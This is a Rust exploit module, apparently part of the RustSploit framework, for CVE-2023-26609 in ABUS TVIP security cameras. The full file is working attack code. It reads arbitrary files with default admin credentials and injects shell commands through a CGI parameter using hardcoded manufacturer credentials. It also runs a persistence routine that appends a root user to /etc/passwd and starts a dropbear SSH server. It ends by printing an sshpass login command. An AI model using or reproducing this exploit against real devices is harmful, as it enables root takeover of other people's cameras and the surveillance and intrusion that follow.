// Exploit Title: ABUS Security Camera TVIP 20000-21150 - LFI, RCE and SSH Root Access
// CVE: CVE-2023-26609
// Author: d1g@segfault.net | Ported to Rust for RustSploit
// PoC converted 1:1 from Bash to async Rust logic

use anyhow::{anyhow, Result, Context};
use colored::*;
use md5;
use reqwest::Client;
use std::time::Duration;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt};
use crate::utils::normalize_target;

const DEFAULT_TIMEOUT_SECS: u64 = 10;



/// Send authenticated LFI request
async fn exploit_lfi(client: &Client, target: &str, filepath: &str) -> Result<()> {
    let host = normalize_target(target)?;
    let url = format!(
        "http://admin:admin@{}/cgi-bin/admin/fileread?READ.filePath={}",
        host, filepath
    );
    println!("{}", format!("[*] Sending LFI request to: {}", url).cyan());

    let resp = client.get(&url).send().await?;
    let status = resp.status();
    let body = resp.text().await?;
    
    if status.is_success() {
        println!("{}", format!("[+] Status: {}", status).green());
        println!("{}", "[+] Body:".green());
        println!("{}", body);
    } else {
        println!("{}", format!("[-] Status: {}", status).red());
        println!("{}", format!("[-] Body:\n{}", body).red());
    }
    Ok(())
}

/// Send authenticated RCE request with command injection
async fn exploit_rce(client: &Client, target: &str, cmd: &str) -> Result<()> {
    let host = normalize_target(target)?;
    let url = format!(
        "http://manufacture:erutcafunam@{}/cgi-bin/mft/wireless_mft?ap=testname;{}",
        host, cmd
    );
    println!("{}", format!("[*] Sending RCE request to: {}", url).cyan());

    let resp = client.get(&url).send().await?;
    let status = resp.status();
    let body = resp.text().await?;
    
    if status.is_success() {
        println!("{}", format!("[+] Status: {}", status).green());
        println!("{}", "[+] Body:".green());
        println!("{}", body);
    } else {
        println!("{}", format!("[-] Status: {}", status).red());
        println!("{}", format!("[-] Body:\n{}", body).red());
    }
    Ok(())
}

/// Stage 1: Generate SSH key
async fn generate_ssh_key(client: &Client, target: &str) -> Result<()> {
    let cmd = "/etc/dropbear/dropbearkey%20-t%20rsa%20-f%20/etc/dropbear/dropbear_rsa_host_key";
    println!("{}", "[*] Stage 1: Generating SSH key on target...".yellow());
    exploit_rce(client, target, cmd).await
}

/// Stage 2: Inject a root user with an MD5-hashed password
async fn inject_root_user(client: &Client, target: &str, password: &str) -> Result<()> {
    // Compute lowercase-hex MD5 of the provided password
    let hash = format!("{:x}", md5::compute(password));
    println!("{}", format!("[*] MD5 hash of password: {}", hash).cyan());

    // Build the echo command to append to /etc/passwd
    let cmd = format!(
        "echo%20d1g:{}:0:0:root:/:/bin/sh%20>>%20/etc/passwd",
        hash
    );
    println!("{}", "[*] Stage 2: Injecting root user into /etc/passwd...".yellow());
    exploit_rce(client, target, &cmd).await
}

/// Stage 3: Start Dropbear SSH server
async fn start_dropbear(client: &Client, target: &str) -> Result<()> {
    let cmd = "/etc/dropbear/dropbear%20-E%20-F";
    println!("{}", "[*] Stage 3: Starting Dropbear SSH server...".yellow());
    exploit_rce(client, target, cmd).await
}

/// Combined SSH persistence exploit
async fn persist_root_shell(client: &Client, target: &str, password: &str) -> Result<()> {
    generate_ssh_key(client, target).await?;
    inject_root_user(client, target, password).await?;
    start_dropbear(client, target).await?;
    println!("{}", "[+] Persistence complete! You can now SSH in with:".green().bold());
    println!(
        "{}",
        format!(
            "    sshpass -p '{}' ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 \\\n         -oHostKeyAlgorithms=+ssh-rsa d1g@{}",
            password, target
        ).cyan()
    );
    Ok(())
}

/// Display module banner
fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   ABUS Security Camera TVIP 20000-21150 Exploit           ║".cyan());
    println!("{}", "║   CVE-2023-26609 - LFI, RCE and SSH Root Access           ║".cyan());
    println!("{}", "║   Variant 1 - Multi-mode (LFI/RCE/Persistence)            ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
}

/// Prompt user for mode, and dispatch accordingly
async fn execute(target: &str) -> Result<()> {
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(DEFAULT_TIMEOUT_SECS))
        .build()?;

    display_banner();
    println!("{}", format!("[*] Target: {}", target).yellow());
    println!();
    println!("{}", "[*] Exploit mode selection:".cyan().bold());
    println!("  {} LFI (Local File Inclusion)", "[1]".green());
    println!("  {} RCE (Remote Code Execution)", "[2]".green());
    println!("  {} SSH Persistence (Full Compromise)", "[3]".green());
    print!("{}", "> ".cyan().bold());
    tokio::io::stdout()
        .flush()
        .await
        .context("Failed to flush stdout")?;

    let mut choice = String::new();
    tokio::io::BufReader::new(tokio::io::stdin())
        .read_line(&mut choice)
        .await
        .context("Failed to read choice")?;
    match choice.trim() {
        "1" => {
            print!("{}", "Enter file path to read (e.g. /etc/passwd): ".cyan().bold());
            tokio::io::stdout()
                .flush()
                .await
                .context("Failed to flush stdout")?;
            let mut fp = String::new();
            tokio::io::BufReader::new(tokio::io::stdin())
                .read_line(&mut fp)
                .await
                .context("Failed to read file path")?;
            exploit_lfi(&client, target, fp.trim()).await?;
        }
        "2" => {
            print!("{}", "Enter command to execute (e.g. id): ".cyan().bold());
            tokio::io::stdout()
                .flush()
                .await
                .context("Failed to flush stdout")?;
            let mut cmd = String::new();
            tokio::io::BufReader::new(tokio::io::stdin())
                .read_line(&mut cmd)
                .await
                .context("Failed to read command")?;
            exploit_rce(&client, target, cmd.trim()).await?;
        }
        "3" => {
            // Ask for the desired password, hash it, and persist
            print!("{}", "Enter desired password for new root user: ".cyan().bold());
            tokio::io::stdout()
                .flush()
                .await
                .context("Failed to flush stdout")?;
            let mut pwd = String::new();
            tokio::io::BufReader::new(tokio::io::stdin())
                .read_line(&mut pwd)
                .await
                .context("Failed to read password")?;
            let pwd = pwd.trim();
            if pwd.is_empty() {
                return Err(anyhow!("Password cannot be empty"));
            }
            persist_root_shell(&client, target, pwd).await?;
        }
        _ => {
            println!("{}", "[-] Invalid choice".red());
            return Err(anyhow!("Invalid choice"));
        }
    }

    Ok(())
}

/// Entry point for the RustSploit dispatch system
pub async fn run(target: &str) -> Result<()> {
    execute(target).await
}